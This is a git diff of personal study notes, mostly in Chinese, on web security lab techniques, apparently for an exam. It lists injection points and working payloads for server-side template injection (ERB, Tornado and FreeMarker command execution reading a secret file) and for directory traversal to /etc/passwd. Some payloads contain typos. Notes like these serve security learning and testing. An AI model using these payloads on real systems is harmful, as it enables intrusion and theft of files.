@@ -1,19 +1,46 @@
+总结lab的特点
 1. Server-side template injection
 常见注入点: 
  a. View more details about the first product
  b. "My account" page里面可以选择firstname/fullname，结果要在提交comment的时候才能看出来。
+ c. Edit product description templates
  
 常见特征:
-If you see something like 'user.firstname', then you should test for SSTI. 
- 
+If you see something like 'user.firstname' in request, then you should test for SSTI. 
  
 常见检测方法: 
 输入: ${{<%[%'"}}%\ 看看这些符号有哪些是变化
-
 
 常见使用payload:
 In the ERB documentation, discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page. 
 From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands.
 <%= system("cat20%/home/carlos/secret") %>
 blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat20%/home/carlos/secret')  [这里特别要注意闭合user.name}}]
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat20%/home/carlos/secret") 
+Search the web for "Handlebars server-side template injection". You should find a well-known exploit posted by @Zombiehelp54.
 
+2. Directory traversal
+常见注入点: 
+ a. In the display of product images.
+ b. 考试中主要出现在admin panel，也是有个显示图片的页面
+ 
+常见特征:
+图片的路径， 比如filename参数 
+ 
+常见使用payload:
+/etc/passwd
+../../../etc/passwd
+....//....//....//etc/passwd
+..%252f..%252f..%252fetc/passwd
+/var/www/images/../../../etc/passwd
+../../../etc/passwd%00.png(这种一般结合upload比较多The application validates that the supplied filename ends with the expected file extension)
+
+
+3. Insecure deserialization
+常见注入点: 
+ a. 
+ 
+常见特征:
+ 
+ 
+常见使用payload:
